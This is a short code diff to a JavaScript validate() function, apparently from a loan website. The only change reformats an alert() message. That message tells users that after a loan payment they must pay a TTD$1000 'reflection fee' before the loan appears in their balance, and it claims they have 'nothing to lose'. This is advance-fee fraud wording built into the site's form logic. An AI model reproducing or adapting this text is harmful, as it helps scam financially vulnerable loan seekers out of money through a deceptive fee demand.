@@ -179,7 +179,8 @@ function validate(){
     count ++
 
     if(count === 1){
-        alert(`Announcement Announcement Announcement
+        alert(`
+            Announcement Announcement Announcement
       Kindly be informed that once your loan payment has been made you’ll need to pay a reflection fee of TTD$1000 so that we can connect our system software to your account for the authentication of your monthly installment before the loan will be able to reflect on your available balance.Note that the fee of TTD$1,000 will be added to your loan for payment so you have nothing to lose.
         `)
     }else{
